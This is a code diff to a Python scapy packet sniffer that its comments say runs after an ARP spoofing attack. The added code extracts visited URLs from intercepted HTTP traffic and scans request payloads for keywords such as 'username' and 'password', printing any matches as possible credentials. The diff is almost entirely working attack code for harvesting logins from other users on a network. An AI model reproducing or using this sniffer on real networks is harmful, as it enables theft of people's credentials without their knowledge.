@@ -7,11 +7,33 @@ from scapy.layers import http
 # first you start arp_spoof then packet_sniffer
 # it will read the most interesting packets
 
+# !!! for http only (not for https) !!!
+
+
+def get_url(packet):
+    return str(packet[http.HTTPRequest].Host, "utf-8") + str(packet[http.HTTPRequest].Path, "utf-8")
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load, "utf-8")
+
+        keywords = ["username", "user", "login", "email", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+        url = get_url(packet)
+        print("[+] HTTP Request --> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password --> " + login_info + "\n\n")
+
+
 
 
 def sniff(interface):
